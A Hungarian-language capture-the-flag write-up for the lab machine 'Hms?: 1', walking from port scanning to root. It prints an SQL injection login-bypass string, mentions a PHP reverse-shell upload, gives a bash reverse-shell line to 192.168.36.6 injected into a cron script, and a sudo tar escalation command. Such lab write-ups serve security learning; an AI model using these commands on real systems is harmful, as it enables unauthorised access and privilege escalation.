- Név:  Hms?: 1
- Megjelenés dátuma: 2021.07.28.
- Szerző: niveK

Leírás: A gép egy egyszerű SQL Injectionre példa, ami könnyen elvégezhető, viszont könnyen kivédhető is lehetne. A gépen a root jogig kell eljutni és egy könnyű szintre sorolnám. A következőkben ennek a folyamatnak a dokumentálása olvasható.

Elsőnek beazonosítom a célgépet a netdiscover paranccsal.


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/1b26ca73-ddbf-4d3b-9493-5d7495b76dca">
</p>

Miután az Nmapel megvizsgáltam a portokat 3 nyitottat találtam. Egy FTP (21), egy SSH(22) és egy 7080-as portot. Az FTP engedélyezi az anonymous belépést, viszont ott nem találunk semmit se.


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/9e39c6aa-6e98-4b2f-9525-701426269718">
</p>

Ha megnézzük a http oldalt a 7080-as porton akkor a következő login panelt kapjuk.

<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/221bfd30-7958-4fcf-a9ad-47a874264cc6">
</p>

Egy egyszerű login panel, amit a burpsuittal könnyedén ellenőrizhetünk, hogy sérülékeny-e az alapvető SQL injectionökre. Ezt a burpsuit intruder funkciójával fogom tesztelni. 


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/e7ac2d56-552f-4140-999b-29617ac3c5ec">
</p>

Itt a pirossal aláhúzott részeket fogom tesztelni a kaliban összegyűjtött alapszintű SQL injectionre.


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/557a036f-016b-40a2-a1cc-08c6f11d42da">
</p>

Ki is dobott pár eredményt. Például: 
' or 1=1 or ''=' ____ ' or 1=1 or ''=' kombináció. Ha ezt beírjuk a login panelbe, nem fog beengedni, mivel egy e-mail típust vár felhasználónévnek. Ezt könnyedén átugorhatjuk, ha az inspect elementbe, kitöröljük a „ type=”e-maill” „ feltételt.


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/743f1079-36cc-4261-be26-68654539c21d">
</p>


Sikeresen bejutottunk az admin panelba.

<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/e469521d-03ef-49d3-af1e-51f07b9246c7">
</p>


Ha megnézzük az oldal forráskódját és kicsit lentebb tekerünk láthatjuk, hogy megjegyzésben találunk egy setting.php oldalt. Itt a jobb alsó sarokban feltűnhet, hogy engedélyezett a file feltöltés. Ezt kihasználva egy reverse shellel könnyedén be tudunk jutni a gépbe. 


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/64860bf1-40f4-4a93-8676-ee4e6e8f3ee5">
</p>


Én ezt a pentestmonkey rev shelljét fogom használni.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Ha feltöltöttük akkor a http://ip-cim:7080/uploadIamge linket meglátogatva megtalálhatjuk a shellt. Ehhez egyben párosítunk egy listenert.


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/14a7ec53-d91d-4fe0-b52d-370067e82cf6">
</p>


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/16cb0382-eb1e-42d6-ac2c-6316d4e08369">
</p>


Két felhasználó is van a gépen. Eren és niveK. Ezután megtaláltam, hogy a bash egy SUID binary. Ezt a GTFOBins oldalon található kóddal könnyedén ki is használhatom.

https://gtfobins.github.io/gtfobins/bash/


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/4a0eb2aa-8090-458c-bbd2-7af198b5a890">
</p>


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/068f6546-a438-4b86-b722-a0551450a6d9">
</p>


Ezt követően az etc mappában találtam egy crontab filet. Egy 5 percenként futó programot találtam, amit az eren user birtokolt. Ezt könnyedén át tudjuk írni.


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/ec5cb8d3-2a4c-4e50-8f4f-bb5dde7b739d">
</p>


Elnavigáltam az adott mappába, és az adott script volt.


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/7fbc86e5-d8a5-4e51-8485-46ff3c292a36">
</p>


Ezt egy kicsit átírva, könnyedén szerezhettünk egy shellt, hogy ténylegesen mi legyünk az eren user.


- #!/bin/bash
- bash -i >& /dev/tcp/192.168.36.6/4443 0>&1
- BACKUP_DIR="/home/eren/backups" 

Ezt a sort beírva a backup.sh fileba, majd nyitva egy másik listenert a 4443-as porton, kapunk is egy shellt, az eren felhasználóval. Ezután a sudo –l paranccsal meg is tudhatjuk, hogy van amit rootként futtathatunk.


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/ff4c7bde-06f8-4f53-8df0-2bbf9a4d0bf0">
</p>

Ezt szokásos módon a https://gtfobins.github.io/ oldalon leírtak alapján exploitolhatjuk.

**sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh**


<p align="center">
  <img src="https://github.com/prox11/CTF-Writeups/assets/148764185/2641db6c-652f-4542-a5c0-49c31a73bf37">
</p>

